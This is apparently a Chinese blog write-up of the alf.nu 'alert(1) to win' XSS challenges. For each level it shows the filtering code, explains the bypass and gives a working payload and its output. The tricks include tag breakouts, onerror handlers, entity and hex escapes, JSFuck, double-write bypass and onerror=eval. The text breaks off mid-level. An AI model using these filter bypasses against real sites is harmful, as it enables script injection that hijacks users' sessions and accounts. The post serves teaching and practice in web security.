---
layout: post
title:  "XSS-alert(1)_to_win"
date:   2019-10-26
desc: ""
keywords: ""
categories: [Web]
tags: []
icon: icon-html
---

# XSS-alert(1)_to_win

## 平台地址与介绍

https://alf.nu/alert1

左侧为题目，括号内为你成功解题使用的payload长度，每解出一题会解锁后面的题目

源码白给，在Input处输入payload，output给出拼接后的代码，若能成功执行alert(1)则判定win

Console output给出控制台输出

Test iframe显示iframe

如图

![1](https://raw.githubusercontent.com/AiDaiP/images/master/xss/1.jpg)



## Warmup

```javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

注入点在`'+s+'`，输入的payload会插入到此处

前面有括号和双引号，首先应该闭合，所以payload开头应为`")`

后面也有括号和双引号，对于这些内容，可以直接注释掉，注释符号为`//`

Payload

```javascript
");alert(1)//
```

Output

```javascript
<script>console.log("");alert(1)//");</script>
```



## Adobe 

```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

replace()使输入的`"`变为`\"`，转义后的双引号只是一个普通的字符，g为全局查找

绕过这个可以把反斜杠转义，转义后的反斜杠只是一个普通的字符，不会再去使双引号转义

Payload

```javascript
\");alert(1)//
```

Output

```javascript
<script>console.log("\\");alert(1)//");</script>
```

Console output

```javascript
\
```

另一种方法

console.log前有`<script>`，可以闭合这个标签然后再开一个新标签alert(1)，这样console.log会报错但是成功执行了alert(1)

Payload

```
</script><script>alert(1)</script>//
```

Output

```javascript
<script>console.log("</script><script>alert(1)</script>//");</script>
```

Console output

```
Error: Uncaught SyntaxError: Invalid or unexpected token
```



## JSON

```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

JSON.stringify将JavaScript值(对象或者数组)转化为一个 JSON字符串

输入`"`，变为`\"`,输入`\`变为`\\`

上一题的第二种方法依然可用

Payload

```
</script><script>alert(1)</script>//
```

Output

```javascript
<script>console.log("</script><script>alert(1)</script>//");</script>
```

Console output

```
Error: Uncaught SyntaxError: Invalid or unexpected token
```



## Markdown

```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

`s.replace(/</g, '&lt;').replace(/"/g, '&quot;');`将所有的`"`和`<`进行转义

`text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');`将所有形如`http://a `的字符串转化为

```
<a href="http://a">http://a</a>
```



```
text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
```

将所有形如`[[a|b]]`的字符串转化为

```
<img alt="b" src="a.gif">
```

利用`<a href="`的`"`闭合alt的`"`

利用`onerror`，在图片加载发生错误时执行js代码

利用注释，把多余的`"`注释掉

例

```javascript
<img onerror=alert(1) src="a.gif">
```

Payload

```
[[a|http://onerror=alert(1)//]]
```

Output

```javascript
<img alt="<a href="http://onerror=alert(1)//" src="a.gif">">http://onerror=alert(1)//]]</a>
```

Test iframe

```
一张裂开的图
```



## DOM

```javascript
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

`m = s.split(/#/);`根据`#`对s进行切割

`document['create'+m[0]]`调用`document.create()`函数

例

如果输入`Comment#AiDAi`

先被分割为Comment和AiDai

然后调用`document.createComment()`

生成`<!--AiDAi-->`

这是html中的注释

闭合注释，在中间插入js标签执行alert(1)

Payload

```
Comment#--><script>alert(1)</script><!--
```

Output

```
<!----><script>alert(1)</script><!---->
```



## Callback

```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

`thing = s.split(/#/);`根据`#`对s进行切割

根据输入生成一个对象再用`JSON.stringify()`转化为一个 JSON字符串

例

输入`AiDAI#aidai`

输出`<script>AiDAI({"userdata":"aidai"})</script>`

`JSON.stringify()`会对一些字符进行转义，但它不会去转义`'`

所以可以利用单引号闭合，使alert(1)逃出来

Payload

```
'#';alert(1)//
```

Output

```
<script>'({"userdata":"';alert(1)//"})</script>
```



## Skandia

```javascript
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

把输入的小写字母全部转化为大写

html标签可以直接闭合，因为html对大小写不敏感，关键在于alert(1)，因为js对大小写敏感

可以利用html字符实体，html字符实体通过html转化为小写的js代码，并不会被js转化为大写

利用img和onerror，图片加载错误时，html字符实体通过html转化为alert(1)并执行

Payload

```
</script><img src=1 onerror = &#97&#108&#101&#114&#116(1)>
```

Output

```
<script>console.log("</SCRIPT><IMG SRC=1 ONERROR = &#97&#108&#101&#114&#116(1)>")</script>
```



## Template

```javascript
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g, 
        function(_, n) { 
           return htmlEscape(args[n]);
         });
  }
  
  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```

利用innerHTML

< > & " '`会被转义，现在需要闭合标签，没有尖括号很难受

但是它没有转义反斜杠，可以通过十六进制构造

```
\x3c <
\x3e >
```

Payload

```
\x3c/a\x3e\x3cimg src=a onerror=alert(1)//
即</a> <img src=a onerror=alert(1)//
```

Output

```
      <h2>Hello, <span id=name></span>!</h2>         
      <script>                                       
         var v = document.getElementById('name');    
         v.innerHTML = '<a href=#>\x3c/a\x3e\x3cimg src=a onerror=alert(1)//</a>';       
      </script>      
```



也可以利用iframe

Payload

```
\x3ciframe onload=alert(1) 
```

Output

```
                                                
      <h2>Hello, <span id=name></span>!</h2>         
      <script>                                       
         var v = document.getElementById('name');    
         v.innerHTML = '<a href=#></a>';       
      </script>    
```



## JSON 2

```javascript
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```

对`" `和`\`转义

把`</script`替换为空

gi：全局查找且忽略大小写

可以双写绕过

例

输入`</s</scriptcript>`

`</script`被替换为空

结果为`</script`

Payload

```
</s</scriptcript><script>alert(1)//
```

Output

```
<script>console.log("</script><script>alert(1)//");</script>
```

Console output

```
Error: Uncaught SyntaxError: Invalid or unexpected token
```



## Callback 2

```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

和Callback相比，多转义了`/`

无法使用`//`注释但是js的注释不止这一种，还可以使用`<!--`

所以这题和Callback相比只是注释符有区别

Payload

```
'#';alert(1)<!--
```

Output

```
<script>'({"userdata":"';alert(1)<!--"})</script>
```



## Skandia 2

```javascript
function escape(s) {
  if (/[<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

不能出现尖括号，有尖括号直接`return '-'`

输入的小写字母会被转化为大写

之前绕过转化大写的方法失效

```
");alert(1)//
```

能输入这个就完事了，关键在于构造alert(1)

可以利用jsfuck构造alert(1)

了解一下jsfuck这个名字直接口吐芬芳的东西

http://www.jsfuck.com/

Payload

```javascript
");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
```

Output

```javascript
<script>console.log("");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//")</script>
```

如果闲的没事可以想一想怎样构造更短的Payloda

## iframe

```javascript
function escape(s) {
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // https://4i.am/?...raw=... just outputs whatever you pass in.
  //
  // Alerting from 4i.am won't count.

  s = '<script>' + s + '<\/script>';
  tag.src = 'https://4i.am/?:XSS=0&CT=text/html&raw=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.setAttribute('onload', 'youWon && alert(1)');
  return tag.outerHTML;
}
```

什么都不输入

输出

```
<iframe src="https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=%3Cscript%3EAiDai%3C%2Fscript%3E" onload="youWon &amp;&amp; alert(1)"></iframe>
```

本地跑一下

创建1.html，把输入复制进去，然后打开，f12看一下

报错

```
1.html:1 Uncaught ReferenceError: youWon is not defined
    at HTMLIFrameElement.onload (1.html:1)
```

youWon未定义

`tag.setAttribute('onload', 'youWon && alert(1)');`

根据这个，如果`youWon`有定义，不为False，就会执行alert(1)

每个frame都有一个全局对象window，name是window的成员属性

输入`name='youWon'`，让youWon变成对象

![2](https://raw.githubusercontent.com/AiDaiP/images/master/xss/2.jpg)

Payload

```
name='youWon'
```

Output

```
![2](https://raw.githubusercontent.com/AiDaiP/images/master/xss/2.jpg)<iframe src="https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=%3Cscript%3Ename%3D'youWon'%3C%2Fscript%3E" onload="youWon &amp;&amp; alert(1)"></iframe>

```



## TI(S)M

```javascript
function escape(s) {
  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
  function html(s) { return s.replace(/[<>"&]/g, function(s) {
                        return '&#' + s.charCodeAt(0) + ';'; }); }

  return (
    '<script>' +
      'var url = ' + json(s) + '; // We\'ll use this later ' +
    '</script>\n\n' +
    '  <!-- for debugging -->\n' +
    '  URL: ' + html(s) + '\n\n' +
    '<!-- then suddenly -->\n' +
    '<script>\n' +
    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
    '  else new Image().src = url;\n' +
    '</script>'
  );
}
```



随便输入点东西`"\/`

```javascript
<script>var url = "\"\\\/"; // We'll use this later </script>

  <!-- for debugging -->
  URL: &#34;\/

<!-- then suddenly -->
<script>
  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);
  else new Image().src = url;
</script>
```

可以看到有很多过滤

下面有一个`*/`，可以利用这个拼接多行注释

`<!--<script>`可以无视`</script>`，把这个标签后的代码全部当作js执行，

`<!--<script>`需要有`-->`闭合

Payload

```
if(alert(1)/*<!--<script>
```

Output

```javascript
<script>var url = "if(alert(1)\/*<!--<script>"; // We'll use this later </script>

  <!-- for debugging -->
  URL: if(alert(1)/*&#60;!--&#60;script&#62;

<!-- then suddenly -->
<script>
  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);
  else new Image().src = url;
</script>

即
<script>var url = "if(alert(1)\/*<!--<script>"; // We'll use this later </script>

  <!-- for debugging -->
  URL: if(alert(1).test(url)) console.log("Bad url: " + url);
  else new Image().src = url;
</script>
```



Console output

```
Error: Uncaught TypeError: Cannot read property 'test' of undefined
```



## JSON 3

```javascript
function escape(s) {
  return s.split('#').map(function(v) {
      // Only 20% of slashes are end tags; save 1.2% of total
      // bytes by only escaping those.
      var json = JSON.stringify(v).replace(/<\//g, '<\\/');
      return '<script>console.log('+json+')</script>';
      }).join('');
}
```

根据`#`分割，随便输入点东西看看

输入`123#456`

输出`<script>console.log("123")</script><script>console.log("456")</script>`

可以利用`<!--<script>#-->`

输入`<!--<script>#-->`

输出`<script>console.log("<!--<script>")</script><script>console.log("-->")</script>`

Console output `Error: Uncaught SyntaxError: Invalid regular expression: missing /`

报错正则表达式少了个/

说明`/script><script>console.log("`被当作了正则表达式

所以需要使/和括号成对出现

Payload

```
<!--<script>#)/;alert(1)//-->
```

Output

```
<script>console.log("<!--<script>")</script><script>console.log(")/;alert(1)//-->")</script>
```

Console output

```
<!--<script>
```



## Skandia 3

```
function escape(s) {
  if (/[\\<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

和Skandia 2相比多过滤了反斜杠

但是jsfuck依然可用

Payload

```
");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
```

Output

```
<script>console.log("");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//")</script>
```



## RFC4627

```javascript
function escape(text) {
  var i = 0;
  window.the_easy_but_expensive_way_out = function() { alert(i++) };

// "A JSON text can be safely passed into JavaScript's eval() function
// (which compiles and executes a string) if all the characters not
// enclosed in strings are in the set of characters that form JSON
// tokens."

  if (!(/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(
          text.replace(/"(\\.|[^"\\])*"/g, '')))) {
    try { 
      var val = eval('(' + text + ')');
      console.log('' + val);
    } catch (_) {
      console.log('Crashed: '+_);
    }
  } else {
    console.log('Rejected.');
  }
}
```

过滤了一堆东西

`Eaeflnrunrstu`这几个字母没有被过滤

进try之后有一个eval可以搞事情

前面给出了`window.the_easy_but_expensive_way_out = function() { alert(i++) };`

`valueOf()`方法返回指定对象的原始值

利用self把`valueOf()`定义为`the_easy_but_expensive_way_out`，然后使两个对象相加，运算时会调用`valueOf()`取对象的原始值，也就调用了`the_easy_but_expensive_way_out`

需要调用两次，因为第一次是alert(0)

Payload

```
{"valueOf":self["the_easy_but_expensive_way_out"]}+{"valueOf":self["the_easy_but_expensive_way_out"]}
```

Output

```
空
```

Console output

```
Alert: 0
NaN
```



## Well

```javascript
function escape(s) {
  http://www.avlidienbrunn.se/xsschallenge/

  s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
  return "<script> var email = '" + s + "'; <\/script>";
}
```

过滤了`\r \n \u2028 \u2029 \ ; , ( ) [ ] <`

没有过滤单引号，可以闭合前面的单引号

可以利用new Function

分号被过滤可以使用|代替

没括号用反引号

Payload

```
'|new Function`a${'alert`1`'}`|'
```

Output

```
<script> var email = ''|new Function`a${'alert`1`'}`|''; </script>
```

Console output

```
Alert: 1 (must be the *number 1)
```

这样弹了个字符串1，不行，必须是数字1

那还是得搞出括号，可以用String.fromCharCode

Payload

```
'|new Function`a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`|'
```

Output

```
<script> var email = ''|new Function`a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`|''; </script>
```



##No

```javascript
// submitted by Stephen Leppik

function escape(s) {
    s = s.replace(/[()`<]/g, ''); // no function calls

    return '<script>\n' +
           'var string = "' + s + '";\n' +
           'console.log(string);\n' +
           '</script>';
}
```

过滤了`( ) <`和反引号

双引号闭合，十六进制搞括号

这题不能像Template那题一样搞，因为没有html标签

eval('alert\x281\x29')可以弹窗，但如何调用它

可以利用异常处理

onerror事件onerror=handleErr

其中`function handleErr(msg,url,line)`

msg为错误消息、url为发生错误的页面的 url、line为发生错误的行

如果onerror=eval，错误信息为'alert\x281\x29'

在异常处理时就会执行eval('alert\x281\x29')

可以利用throw抛出错误信息

Payload

```
";onerror=eval;throw'=alert\x281\x29'//
```

Output



## K'Z'K

```javascript
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels in honor of K'Z'K the Destroyer
    s = s.replace(/[aeiouy]/gi, '');
    return '<script>console.log("' + s + '");</script>';
}
```

`aeiouy`被过滤，可以用十六进制绕过

我寻思jsfuck可行啊

Payload

```
");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
```





Output

```
<script>console.log("");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//");</script>
```

其实这题是用构造匿名函数做的

```
");[]["pop"]["constructor"]('alert(1)')()//
```

绕过过滤

Payload

```
");[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()//
```

Output

```
<script>console.log("");[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()//");</script>
```

## K'Z'K

```javascript
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels and escape sequences in honor of K'Z'K 
    // y is only sometimes a vowel, so it's only removed as a literal
    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
    // remove certain characters that can be used to get vowels
    s = s.replace(/[{}!=<>]/g, '');
    return '<script>console.log("' + s + '");</script>';
}
```

和K'Z'K相比，`!`被过滤，jsfuck玩不成了

还有把编码的字符串也替换为空，可以双写绕过

例

输入`\\x6fx6f`，`\x6f`被替换为空，剩下`\x6f`

还是构造

```
");[]["pop"]["constructor"]('alert(1)')()//
```

Payload

```
");[]["p\\x6fx6fp"]["c\\x6fx6fnstr\\x75x75ct\\x6fx6fr"]('\\x61x61l\\x65x65rt(1)')()//
```

Output

```
<script>console.log("");[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()//");</script>
```



## K'Z'K

```javascript
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels in honor of K'Z'K the Destroyer
    s = s.replace(/[aeiouy]/gi, '');
